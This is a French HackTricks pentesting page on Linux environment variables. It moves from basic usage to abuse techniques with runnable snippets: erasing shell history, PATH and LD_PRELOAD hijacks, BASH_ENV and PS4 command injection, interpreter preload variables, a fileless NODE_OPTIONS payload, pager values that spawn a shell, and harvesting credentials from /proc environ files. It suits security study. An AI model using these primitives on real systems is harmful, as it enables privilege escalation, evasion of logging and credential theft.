# Variables d’environnement Linux

{{#include ../../banners/hacktricks-training.md}}

## Variables globales

Les variables globales **seront** héritées par les **processus enfants**.

Vous pouvez créer une variable globale pour votre session actuelle en exécutant :
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Cette variable sera accessible par vos sessions actuelles et leurs processus enfants.

Vous pouvez **supprimer** une variable en exécutant :
```bash
unset MYGLOBAL
```
## Variables locales

Les **variables locales** peuvent uniquement être **accédées** par le **shell/script actuel**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Lister les variables actuelles
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Le contenu de `/proc/*/environ` est séparé par des caractères **NUL**, donc ces variantes sont généralement plus faciles à lire :
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Si vous recherchez des **credentials** ou une **configuration de service intéressante** dans des environnements hérités, consultez également [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Variables courantes

Depuis : [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – l’affichage utilisé par **X**. Cette variable est généralement définie sur **:0.0**, ce qui signifie le premier affichage de l’ordinateur actuel.
- **EDITOR** – l’éditeur de texte préféré de l’utilisateur.
- **HISTFILESIZE** – le nombre maximal de lignes contenues dans le fichier d’historique.
- **HISTSIZE** – le nombre de lignes ajoutées au fichier d’historique lorsque l’utilisateur termine sa session.
- **HOME** – votre répertoire personnel.
- **HOSTNAME** – le nom d’hôte de l’ordinateur.
- **LANG** – votre langue actuelle.
- **MAIL** – l’emplacement du spool de courrier de l’utilisateur. Généralement **/var/spool/mail/USER**.
- **MANPATH** – la liste des répertoires à rechercher pour les pages de manuel.
- **OSTYPE** – le type de système d’exploitation.
- **PS1** – l’invite par défaut dans bash.
- **PATH** – contient le chemin de tous les répertoires qui hébergent les fichiers binaires que vous souhaitez exécuter en indiquant simplement le nom du fichier, et non un chemin relatif ou absolu.
- **PWD** – le répertoire de travail actuel.
- **SHELL** – le chemin vers le shell de commandes actuel (par exemple, **/bin/bash**).
- **TERM** – le type de terminal actuel (par exemple, **xterm**).
- **TZ** – votre fuseau horaire.
- **USER** – votre nom d’utilisateur actuel.

## Variables intéressantes pour le hacking

Toutes les variables ne sont pas aussi utiles les unes que les autres. D’un point de vue offensif, donnez la priorité aux variables qui modifient les **chemins de recherche**, les **fichiers de démarrage**, le **comportement de l’éditeur de liens dynamique** ou l’**audit/la journalisation**.

### **HISTFILESIZE**

Modifiez la **valeur de cette variable à 0** afin que, lorsque vous **terminez votre session**, le **fichier d’historique** (\~/.bash_history) soit **tronqué à 0 ligne**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Changez la **valeur de cette variable à 0**, afin que les commandes **ne soient pas conservées dans l'historique en mémoire** et ne soient pas réécrites dans le **fichier d'historique** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Si la **valeur de cette variable est définie sur `ignorespace` ou `ignoreboth`**, toute commande précédée d’un espace supplémentaire ne sera pas enregistrée dans l’historique.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Pointez le **fichier d’historique** vers **`/dev/null`** ou désactivez-le complètement. Cette méthode est généralement plus fiable que de modifier uniquement la taille de l’historique.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Les processus utiliseront le **proxy** déclaré ici pour se connecter à Internet via **http ou https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy` : proxy par défaut pour les outils/protocoles qui le prennent en charge.
- `no_proxy` : liste de contournement (hôtes/domaines/CIDR) qui doivent se connecter directement.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Les variantes en minuscules et en majuscules peuvent être utilisées selon l’outil (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Les processus feront confiance aux certificats indiqués dans **ces variables d’environnement**. Cela permet de faire en sorte que des outils tels que **`curl`**, **`git`**, les clients HTTP Python ou les gestionnaires de paquets fassent confiance à une CA contrôlée par l’attaquant (par exemple, pour faire passer un proxy d’interception pour un proxy légitime).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Si un wrapper/script privilégié exécute des commandes **sans chemins absolus**, le **premier répertoire contrôlé par l’attaquant** dans `PATH` est prioritaire. C’est le primitive à l’origine de nombreux **PATH hijacks** dans `sudo`, les tâches cron, les shell wrappers et les helpers SUID personnalisés. Recherchez `env_keep+=PATH`, un `secure_path` faible ou des wrappers qui appellent `tar`, `service`, `cp`, `python`, etc. par leur nom.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Pour les chaînes complètes de privilege-escalation exploitant `PATH`, consultez [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` n'est pas seulement une référence vers un répertoire : de nombreux outils chargent automatiquement des **dotfiles**, des **plugins** et la **configuration par utilisateur** depuis `$HOME` ou `$XDG_CONFIG_HOME`. Si un workflow privilégié conserve ces valeurs, la **config injection** peut être plus facile que le **binary hijacking**.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Les cibles intéressantes incluent `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` et les fichiers spécifiques à certains outils, tels que `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Ces variables influencent le **dynamic linker** :

- `LD_PRELOAD` : force le chargement préalable d’objets partagés supplémentaires.
- `LD_LIBRARY_PATH` : ajoute en préfixe des répertoires de recherche de bibliothèques.
- `LD_AUDIT` : charge des bibliothèques d’audit qui observent le chargement des bibliothèques et la résolution des symboles.

Elles sont extrêmement utiles pour le **hooking**, l’**instrumentation** et la **privilege escalation** lorsqu’une commande privilégiée les conserve. En mode **secure-execution** (`AT_SECURE`, par exemple avec setuid/setgid/capabilities), le loader supprime ou restreint nombre de ces variables. Cependant, les bugs de parsing à cette étape précoce du loader restent très impactants, car ils s’exécutent **avant** le programme cible.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` modifie le comportement précoce de glibc (par exemple, les paramètres de l’allocator) et est très pratique dans les exploit labs. Il est également important du point de vue de la sécurité, car le **dynamic loader l’analyse très tôt**. La vulnérabilité **Looney Tunables** de 2023 a rappelé qu’une seule variable d’environnement analysée par le loader pouvait devenir une **primitive d’élévation de privilèges locale** contre des programmes SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Si **Bash** est démarré de manière **non interactive**, il vérifie `BASH_ENV` et source ce fichier avant d’exécuter le script cible. Lorsque Bash est invoqué en tant que `sh`, ou en mode interactif de style POSIX, `ENV` peut également être consulté. Il s’agit d’une méthode classique pour transformer un wrapper shell en exécution de code lorsque l’environnement est contrôlé par l’attaquant.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash ignore ces fichiers de démarrage lorsque les **identifiants réels/effectifs diffèrent** ; `-p` préserve l’identifiant effectif, mais n’active pas ces fichiers de démarrage. Le comportement exact dépend donc de la manière dont le wrapper invoque le shell. Soyez prudent avec les wrappers privilégiés qui appellent `setuid()`/`setgid()` **avant** de lancer Bash : une fois que les identifiants correspondent à nouveau, Bash peut faire confiance à `BASH_ENV`, `ENV` et à l’état associé du shell, qui auraient autrement été ignorés.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Lorsque Bash s’exécute avec **xtrace** activé, il développe `PS4` et l’affiche avant chaque commande tracée. `PS4` est développé comme une invite ; une **substitution de commande** qu’il contient est donc exécutée. Point crucial, xtrace peut être activé uniquement depuis l’environnement en exportant `SHELLOPTS=xtrace` — aucun `-x` sur la ligne de commande n’est nécessaire — ainsi, tout script Bash exécuté par la victime devient une exécution de code.<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` ne fait rien tant que xtrace n’est pas activé (`SHELLOPTS=xtrace`, `set -x` ou `bash -x`), et Bash supprime `SHELLOPTS` dans les contextes privilégiés/setuid, tout comme `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Ces variables modifient le démarrage de Python :

- `PYTHONPATH` : ajoute des chemins de recherche d’imports au début.
- `PYTHONHOME` : déplace l’arborescence de la bibliothèque standard.
- `PYTHONSTARTUP` : exécute un fichier avant l’invite interactive.
- `PYTHONINSPECT=1` : passe en mode interactif après la fin d’un script.
- `PYTHONBREAKPOINT` : `package.module.callable` est appelé (et son module importé) lorsque le code atteint `breakpoint()`.<sup>[[8]](#references)</sup>

Elles sont utiles contre les scripts de maintenance, les débogueurs, les shells et les wrappers qui appellent Python avec un environnement contrôlable. `python -E` et `python -I` ignorent toutes les variables `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
Un exemple concret récent était le LPE **needrestart** de 2024 sur les systèmes Ubuntu/Debian : le scanner appartenant à root copiait le `PYTHONPATH` d’un processus non privilégié depuis `/proc/<PID>/environ`, puis exécutait Python. L’exploit publié plaçait `importlib/__init__.so` dans le chemin contrôlé par l’attaquant, afin que Python exécute le code de l’attaquant lors de sa propre initialisation, avant même que le script codé en dur du helper n’ait d’importance.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl possède des variables de démarrage tout aussi utiles :

- `PERL5LIB` : préfixer les répertoires de bibliothèques.
- `PERL5OPT` : injecter des options comme si elles figuraient sur chaque ligne de commande `perl`.

Cela peut forcer le **chargement automatique de modules** ou modifier le comportement de l’interpréteur avant que le script cible n’effectue quoi que ce soit d’intéressant. Perl ignore ces variables dans les contextes **taint / setuid / setgid**, mais elles restent très importantes pour les wrappers exécutés par root, les jobs CI, les installateurs et les règles sudoers personnalisées.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` ajoute des **options CLI de Node.js** à chaque processus `node` qui hérite de l’environnement. Cela le rend utile contre les wrappers, les tâches CI, les helpers Electron et les règles sudo qui finissent par invoquer Node. Les options les plus intéressantes d’un point de vue offensif sont généralement :

- `--require <file>` : précharge un fichier CommonJS avant le script cible.
- `--import <module>` : précharge un module ES avant le script cible.

Node refuse certaines options dangereuses dans `NODE_OPTIONS`, mais `--require` et `--import` sont explicitement autorisées et traitées **avant** les arguments classiques de la ligne de commande.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### Préchargement sans fichier avec une URL `data:`

Lorsque vous pouvez définir `NODE_OPTIONS` mais que vous **ne pouvez pas écrire de fichier** sur la cible (système de fichiers en lecture seule, API restreinte, runtime serverless, etc.), `--import` accepte une URL `data:text/javascript,`, ce qui permet de transporter l’intégralité du payload directement dans la variable d’environnement. Le JavaScript doit être **entièrement encodé dans l’URL** — Node analyse la valeur comme une URL, donc tout espace brut (ou autre caractère non encodé) tronque le payload et provoque une `SyntaxError`. Cela fonctionne sur Node 20.6+ où `--import` figure dans l’allowlist de `NODE_OPTIONS`.<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> Il s'agit d'une méthode courante pour transformer le contrôle de `NODE_OPTIONS` en RCE sur des **environnements cloud gérés** dont les fonctions utilisent Node. Par exemple, un attaquant qui peut uniquement modifier la configuration d'une Lambda (`lambda:UpdateFunctionConfiguration`, sans `iam:PassRole` ni mise à jour du code) peut injecter `NODE_OPTIONS=--import data:text/javascript,<payload>` afin d'exécuter du code dans la fonction et de voler les identifiants de son rôle d'exécution. Le module injecté s'exécute **avant** le handler, qui continue ensuite de s'exécuter normalement.

Pour les chaînes de gadgets distantes qui définissent indirectement `NODE_OPTIONS` (par exemple, via une prototype-pollution menant à une RCE), consultez [cette autre page](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby offre la même catégorie d'abus au démarrage :

- `RUBYLIB` : ajoute des répertoires au début du chemin de chargement de Ruby.
- `RUBYOPT` : injecte des options de ligne de commande telles que `-r` dans chaque invocation de `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Les vulnérabilités de **needrestart** découvertes en 2024 ont montré qu'il ne s'agissait pas seulement d'une astuce de laboratoire : le même helper appartenant à root, vulnérable à l'abus de `PYTHONPATH`, pouvait également être contraint d'exécuter Ruby avec un `RUBYLIB` contrôlé par l'attaquant, en chargeant `enc/encdb.so` depuis un répertoire contrôlé par l'attaquant.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim exécutent les commandes Ex contenues dans `VIMINIT` (ou dans son fallback `EXINIT`) lors d'un démarrage normal. Les commandes Ex incluent `:!cmd` et `:call system(...)` ; contrôler cette variable permet donc l'exécution de code chaque fois qu'une victime ouvre Vim (`sudo vim` avec les privilèges root, `crontab -e`, `visudo`, `git`/`less` lançant `$EDITOR`, etc.).<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
Le mode batch (`vim -es`/`-Es`) ignore ces variables, mais un démarrage interactif normal les exécute.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS et CLR profiler**

PowerShell Core (`pwsh`) fonctionne sous Linux/macOS (ainsi que sous Windows) et est une **application .NET**. Ainsi, plusieurs variables d'environnement transforment tout appel à `pwsh` avec un environnement hérité en exécution de code — ce qui est utile contre les tâches cron/jobs systemd, les runners CI et les wrappers privilégiés qui lancent `pwsh`.

- `PSModulePath` : PowerShell recherche récursivement dans chaque répertoire de cette liste les modules `.psd1`/`.psm1` et en **charge automatiquement** un dès qu'une commande qu'il exporte est référencée. Ajoutez un répertoire au début de la liste et le code de premier niveau de votre module s'exécute lors de l'importation ; comme la résolution suit l'ordre *Alias → Function → Cmdlet*, une fonction exportée peut même masquer un cmdlet intégré appelé par la victime.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME` : déplace `powershell/Microsoft.PowerShell_profile.ps1`, exécuté au démarrage (sauf avec `-NoProfile`).
- `DOTNET_STARTUP_HOOKS` : assembly managée dont `StartupHook.Initialize()` s'exécute avant `Main` (partagée par chaque application .NET).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so` : l'API de profiling CLR charge une bibliothèque contrôlée par l'attaquant dans le processus au démarrage (les variables de chemin prennent le pas sur le registre ; `DOTNET_*` est l'alias plus récent). Sous Windows PowerShell 5.1 (.NET Framework), utilisez `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
Sous Windows, `PSExecutionPolicyPreference=Bypass` supprime également la protection contre l’exécution des « unsigned scripts », permettant ainsi à un profile/module placé sur le système de s’exécuter. Consultez la page dédiée pour découvrir les PoCs complets :

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Certains outils ne se contentent pas de lire un chemin depuis l’environnement ; ils transmettent la valeur à un **shell**, un **editor** ou un **input preprocessor**. Ces variables sont donc particulièrement intéressantes lorsqu’un wrapper privilégié exécute `git`, `man`, `less` ou des text viewers similaires :

- `PAGER`, `MANPAGER`, `GIT_PAGER` : choisissent la commande du pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR` : choisissent la commande de l’editor, souvent avec des arguments.
- `LESSOPEN`, `LESSCLOSE` : définissent les pre/post-processors exécutés lorsque `less` ouvre un fichier.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git prend également en charge l’**injection de configuration uniquement via l’environnement** sans toucher au disque via `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` et `GIT_CONFIG_VALUE_<n>` :
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Du point de vue du post-exploitation, rappelez-vous également que les environnements hérités contiennent souvent des **identifiants**, des **paramètres proxy**, des **jetons de service** ou des **clés cloud**. Consultez [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) pour rechercher `/proc/<PID>/environ` et `Environment=` dans `systemd`.

### PS1

Modifiez l'apparence de votre invite.

[**Voici un exemple**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root :

![PERL5OPT & PERL5LIB - PS1 : Voici un exemple](<../images/image (897).png>)

Utilisateur standard :

![PERL5OPT & PERL5LIB - PS1 : Une, deux et trois tâches en arrière-plan](<../images/image (740).png>)

Une, deux et trois tâches en arrière-plan :

![PERL5OPT & PERL5LIB - PS1 : Une, deux et trois tâches en arrière-plan](<../images/image (145).png>)

Une tâche en arrière-plan, une tâche arrêtée et la dernière commande ne s'est pas terminée correctement :

![PERL5OPT & PERL5LIB - PS1 : Une tâche en arrière-plan, une tâche arrêtée et la dernière commande ne s'est pas terminée correctement](<../images/image (715).png>)

## References

- [1] [Manuel GNU Bash - Fichiers de démarrage de Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - page de manuel Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE dans needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Documentation CLI de Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Variables d'environnement courantes - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911 : Looney Tunables - élévation de privilèges locale dans le ld.so de glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Manuel GNU Bash - Variables Bash (`PS4`) et builtin Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - breakpoint() intégré et PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Documentation de Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath et chargement automatique des modules PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Paramètres de configuration du debugging et du profiling .NET (variables de profiling `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
